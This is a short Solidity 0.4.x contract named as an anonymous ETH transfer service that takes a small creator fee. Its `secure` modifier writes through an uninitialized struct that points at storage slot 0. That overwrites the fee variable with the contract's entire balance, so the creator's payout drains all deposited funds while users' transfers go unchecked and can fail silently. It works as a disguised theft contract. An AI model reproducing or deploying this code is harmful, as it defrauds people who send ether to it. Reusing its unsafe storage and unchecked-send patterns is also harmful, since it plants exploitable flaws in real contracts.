1 pragma solidity ^0.4.19;
2 
3 contract ETH_ANONIM_TRANSFER    
4 {
5     uint256 feePaid;
6     uint256 creatorFee = 0.001 ether;
7     uint256 totalTransfered;
8     address creator = msg.sender;
9     
10     struct Transfer
11     {
12         uint256 timeStamp;
13         uint256 currContractBallance;
14         uint256 inAm;
15     }
16     
17     Transfer[] Log;
18     
19     modifier secure
20     {
21         require(msg.sender == tx.origin);
22         Transfer LogUnit;
23         LogUnit.timeStamp = now;
24         LogUnit.currContractBallance = this.balance;
25         LogUnit.inAm = msg.value;
26         Log.push(LogUnit);
27         _;
28     }
29     
30     function() public payable{}
31     
32     function MakeTransfer(address _adr, uint256 _am)
33     external
34     payable
35     secure
36     {
37         if(msg.value > 1 ether)
38         {
39             creator.send(creatorFee);
40             _adr.send(_am);
41             
42             feePaid+=creatorFee;
43             totalTransfered+=_am;
44         }
45     }    
46     
47 }